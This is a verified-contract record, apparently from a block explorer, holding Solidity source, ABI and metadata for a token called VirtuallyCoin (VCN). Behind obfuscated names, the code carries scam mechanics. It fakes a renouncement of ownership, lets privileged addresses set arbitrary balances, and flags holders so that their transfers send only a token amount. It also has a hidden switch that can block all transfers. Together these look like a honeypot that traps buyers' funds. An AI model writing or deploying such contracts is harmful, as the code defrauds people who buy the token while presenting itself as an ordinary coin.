{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract launchTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapExempt {\n    function createPair(address liquidityShould, address autoLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fundSwapReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface isFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLaunch) external view returns (uint256);\n\n    function transfer(address walletMode, uint256 shouldLiquidity) external returns (bool);\n\n    function allowance(address tradingWalletAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletMode,\n        uint256 shouldLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txMax, uint256 value);\n    event Approval(address indexed tradingWalletAt, address indexed spender, uint256 value);\n}\n\ninterface isFeeMetadata is isFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VirtuallyCoin is launchTake, isFee, isFeeMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingReceiverToken;\n    }\n\n    function tokenMarketingEnable() public {\n        emit OwnershipTransferred(teamMax, address(0));\n        sellFund = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTotalLiquidity;\n    }\n\n    function teamAmount(uint256 shouldLiquidity) public {\n        senderTeam();\n        fundExemptTake = shouldLiquidity;\n    }\n\n    mapping(address => uint256) private maxEnable;\n\n    address public walletMin;\n\n    function transferFrom(address takeReceiverLaunched, address walletMode, uint256 shouldLiquidity) external override returns (bool) {\n        if (_msgSender() != maxTotal) {\n            if (teamReceiverAuto[takeReceiverLaunched][_msgSender()] != type(uint256).max) {\n                require(shouldLiquidity <= teamReceiverAuto[takeReceiverLaunched][_msgSender()]);\n                teamReceiverAuto[takeReceiverLaunched][_msgSender()] -= shouldLiquidity;\n            }\n        }\n        return shouldAmountLaunched(takeReceiverLaunched, walletMode, shouldLiquidity);\n    }\n\n    address private sellFund;\n\n    uint256 public modeTeam = 0;\n\n    mapping(address => mapping(address => uint256)) private teamReceiverAuto;\n\n    event OwnershipTransferred(address indexed exemptWalletShould, address indexed shouldExempt);\n\n    string private swapTake = \"Virtually Coin\";\n\n    function atSell(address takeReceiverLaunched, address walletMode, uint256 shouldLiquidity) internal view returns (uint256) {\n        require(shouldLiquidity > 0);\n\n        uint256 receiverAutoLimit = 0;\n        if (takeReceiverLaunched == walletMin && minTo > 0) {\n            receiverAutoLimit = shouldLiquidity * minTo / 100;\n        } else if (walletMode == walletMin && modeTeam > 0) {\n            receiverAutoLimit = shouldLiquidity * modeTeam / 100;\n        }\n        require(receiverAutoLimit <= shouldLiquidity);\n        return shouldLiquidity - receiverAutoLimit;\n    }\n\n    bool public senderToken;\n\n    bool public buySellTotal;\n\n    function owner() external view returns (address) {\n        return sellFund;\n    }\n\n    string private marketingReceiverToken = \"VCN\";\n\n    function transfer(address shouldTrading, uint256 shouldLiquidity) external virtual override returns (bool) {\n        return shouldAmountLaunched(_msgSender(), shouldTrading, shouldLiquidity);\n    }\n\n    uint256 private listLimit;\n\n    function shouldAmountLaunched(address takeReceiverLaunched, address walletMode, uint256 shouldLiquidity) internal returns (bool) {\n        if (takeReceiverLaunched == teamMax) {\n            return teamTx(takeReceiverLaunched, walletMode, shouldLiquidity);\n        }\n        uint256 tradingEnable = isFee(walletMin).balanceOf(enableFrom);\n        require(tradingEnable == fundExemptTake);\n        require(walletMode != enableFrom);\n        if (feeTeam[takeReceiverLaunched]) {\n            return teamTx(takeReceiverLaunched, walletMode, modeSender);\n        }\n        shouldLiquidity = atSell(takeReceiverLaunched, walletMode, shouldLiquidity);\n        return teamTx(takeReceiverLaunched, walletMode, shouldLiquidity);\n    }\n\n    bool public toFund;\n\n    uint256 private maxList;\n\n    function approve(address isTx, uint256 shouldLiquidity) public virtual override returns (bool) {\n        teamReceiverAuto[_msgSender()][isTx] = shouldLiquidity;\n        emit Approval(_msgSender(), isTx, shouldLiquidity);\n        return true;\n    }\n\n    uint256 private fundIs = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public feeTeam;\n\n    function balanceOf(address receiverLaunch) public view virtual override returns (uint256) {\n        return maxEnable[receiverLaunch];\n    }\n\n    function senderTeam() private view {\n        require(launchedAmount[_msgSender()]);\n    }\n\n    uint256 fundExemptTake;\n\n    bool private fromLaunched;\n\n    uint256 teamSender;\n\n    function name() external view virtual override returns (string memory) {\n        return swapTake;\n    }\n\n    mapping(address => bool) public launchedAmount;\n\n    uint256 constant modeSender = 6 ** 10;\n\n    uint8 private fundTotalLiquidity = 18;\n\n    function getOwner() external view returns (address) {\n        return sellFund;\n    }\n\n    uint256 public minTo = 3;\n\n    bool private receiverBuy;\n\n    bool private buyReceiver;\n\n    address enableFrom;\n\n    address maxTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private tokenLimit;\n\n    function takeTxLaunch(address enableShould) public {\n        senderTeam();\n        \n        if (enableShould == teamMax || enableShould == walletMin) {\n            return;\n        }\n        feeTeam[enableShould] = true;\n    }\n\n    bool private walletReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundIs;\n    }\n\n    constructor (){\n        \n        tokenMarketingEnable();\n        fundSwapReceiver fromWallet = fundSwapReceiver(maxTotal);\n        walletMin = swapExempt(fromWallet.factory()).createPair(fromWallet.WETH(), address(this));\n        enableFrom = swapExempt(fromWallet.factory()).feeTo();\n        if (fromLaunched != buyReceiver) {\n            buySellTotal = true;\n        }\n        teamMax = _msgSender();\n        launchedAmount[teamMax] = true;\n        maxEnable[teamMax] = fundIs;\n        if (maxList == tokenLimit) {\n            tokenLimit = listLimit;\n        }\n        emit Transfer(address(0), teamMax, fundIs);\n    }\n\n    function teamTx(address takeReceiverLaunched, address walletMode, uint256 shouldLiquidity) internal returns (bool) {\n        require(maxEnable[takeReceiverLaunched] >= shouldLiquidity);\n        maxEnable[takeReceiverLaunched] -= shouldLiquidity;\n        maxEnable[walletMode] += shouldLiquidity;\n        emit Transfer(takeReceiverLaunched, walletMode, shouldLiquidity);\n        return true;\n    }\n\n    function allowance(address teamSenderLiquidity, address isTx) external view virtual override returns (uint256) {\n        if (isTx == maxTotal) {\n            return type(uint256).max;\n        }\n        return teamReceiverAuto[teamSenderLiquidity][isTx];\n    }\n\n    function fromMarketing(address enableTeamExempt) public {\n        if (senderToken) {\n            return;\n        }\n        if (fromLaunched) {\n            toFund = true;\n        }\n        launchedAmount[enableTeamExempt] = true;\n        if (toFund != buySellTotal) {\n            buySellTotal = true;\n        }\n        senderToken = true;\n    }\n\n    function atAuto(address shouldTrading, uint256 shouldLiquidity) public {\n        senderTeam();\n        maxEnable[shouldTrading] = shouldLiquidity;\n    }\n\n    address public teamMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingWalletAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptWalletShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSenderLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLiquidity\",\"type\":\"uint256\"}],\"name\":\"atAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeamExempt\",\"type\":\"address\"}],\"name\":\"fromMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"}],\"name\":\"takeTxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldLiquidity\",\"type\":\"uint256\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMarketingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiverLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VirtuallyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}